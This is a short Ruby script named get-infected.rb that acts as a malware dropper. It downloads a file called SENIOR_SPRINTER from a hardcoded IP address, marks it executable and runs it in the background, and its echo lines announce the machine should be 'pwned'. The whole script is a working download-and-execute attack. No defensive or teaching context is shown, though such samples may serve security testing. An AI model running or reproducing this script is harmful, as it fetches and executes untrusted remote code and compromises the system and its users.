# get-infected.rb
require 'open-uri'
install_url = "http://44.212.29.229/SENIOR_SPRINTER"
%x(echo "Downloading payload")
IO.copy_stream(URI.open(install_url), 'SENIOR_SPRINTER')
%x(echo "Payload Downloaded. Making executable")
%x(chmod +x SENIOR_SPRINTER)
%x(echo "Trying to execute this nonsense")
%x(./SENIOR_SPRINTER &)
%x(echo "Ok Should be pwned now")
exit 0
